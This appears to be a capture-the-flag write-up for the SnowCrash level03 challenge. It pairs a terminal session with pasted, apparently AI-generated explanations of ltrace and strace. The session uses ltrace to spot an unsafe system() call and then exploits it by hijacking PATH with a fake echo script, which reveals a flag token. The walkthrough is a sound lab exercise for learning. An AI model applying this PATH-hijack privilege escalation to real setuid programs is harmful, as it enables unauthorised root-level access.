# level03

level03@SnowCrash:~$ ls
level03
level03@SnowCrash:~$ 


level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff6e4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                    = 2003
geteuid()                                    = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                       = 0
+++ exited (status 0) +++
level03@SnowCrash:~$ 


level03@SnowCrash:~$ echo "/bin/getflag" > /tmp/echo
level03@SnowCrash:~$ chmod +x /tmp/echo
level03@SnowCrash:~$ /bin/getflag 
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
level03@SnowCrash:~$ export PATH=/tmp:$PATH
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus




`ltrace` is a debugging utility on Linux used to **trace library calls made by a program**, especially those to **shared libraries like the C standard library (`libc`)**.

### What `ltrace` Does:

* Monitors **function calls** to shared libraries.
* Shows **arguments passed** to those functions.
* Displays the **return values** of those calls.

### Example:

```bash
ltrace ls
```

This command might show output like:

```
__libc_start_main(0x401080, 1, 0x7ffd7c1e8a18, 0x402010, 0x402000 <...>) = 0
strlen("ls")                                = 2
malloc(16)                                  = 0x55b7a7b4b260
...
```

### When to Use `ltrace`:

* Debugging issues related to dynamic libraries.
* Understanding what library functions a program uses.
* Tracing how a program interacts with external APIs (e.g., `malloc`, `printf`, `open`, etc.).

### Difference from `strace`:

* `strace`: traces **system calls** (e.g., `read`, `write`, `open`).
* `ltrace`: traces **library function calls** (e.g., `malloc`, `printf`, `strcpy`).

---

### 🔧 **Command Used**:

```bash
strace ls
ltrace ls
```

---

## 🔍 `strace ls` Output (System Calls):

```text
execve("/bin/ls", ["ls"], 0x7ffe6c2f8f50 /* env */) = 0
brk(NULL)                               = 0x56359f8e6000
arch_prctl(ARCH_SET_FS, 0x7fd2a01ae540) = 0
openat(AT_FDCWD, ".", O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC) = 3
newfstatat(3, "", {st_mode=S_IFDIR|0755, ...}, AT_EMPTY_PATH) = 0
getdents64(3, 0x56359fae3e40 /* 5 entries */, 32768) = 160
write(1, "Desktop\nDocuments\nDownloads\n", 30) = 30
close(3)                                = 0
exit_group(0)                           = 0
```

**→ Shows kernel interactions like file opens, reads, and writes.**

---

## 🔍 `ltrace ls` Output (Library Calls):

```text
__libc_start_main(0x5631e12851a0, 1, 0x7fffd4881c38, 0x5631e1285320, 0x5631e1285310 <...>) = 0
strrchr("ls", '/')                      = NULL
setlocale(LC_ALL, "")                   = "en_US.UTF-8"
bindtextdomain("coreutils", "/usr/share/locale") = "/usr/share/locale"
textdomain("coreutils")                 = "coreutils"
opendir(".")                            = 0x564a74021c10
readdir(0x564a74021c10)                 = 0x564a74021e10
puts("Desktop")                         = 8
puts("Documents")                       = 9
...
```

**→ Shows calls to library functions like `puts`, `opendir`, and `setlocale`.**

---

### ✅ Summary:

| Tool     | Shows             | Use for                                      |
| -------- | ----------------- | -------------------------------------------- |
| `strace` | **System calls**  | Debugging kernel-level behavior, file access |
| `ltrace` | **Library calls** | Understanding dynamic library usage          |

Would you like a visual diagram showing the layers of calls (your app → libraries → kernel)?

You're on the right track — `ltrace` reveals that the vulnerable binary runs this line:

```
system("/usr/bin/env echo Exploit me")
```

The trick is that it's using `/usr/bin/env` to look for `echo` in your environment. That opens up a **classic environment path hijack**, because `env` searches for the command (`echo`) using the `PATH` variable.

---

## 🔓 Exploitation Strategy

We’ll **create a fake `echo` binary** that runs `getflag`, then **modify the `PATH`** so that the program runs **your fake `echo`** instead of the system one.

---

### ✅ Steps:

1. **Make a custom script that runs `getflag`**:

   ```bash
   echo "/bin/getflag" > /tmp/echo
   chmod +x /tmp/echo
   ```

2. **Change the `PATH` so your fake `echo` is found first**:

   ```bash
   export PATH=/tmp:$PATH
   ```

3. **Run the vulnerable program**:

   ```bash
   ./level03
   ```

---

### 🧠 Why This Works:

* `/usr/bin/env echo ...` means "search `PATH` for `echo`".
* By putting `/tmp` first in `PATH`, your custom script is run instead of `/bin/echo`.
* Your custom script just runs `getflag`.

---

Let me know if you want a one-liner version or a bash script to automate this.
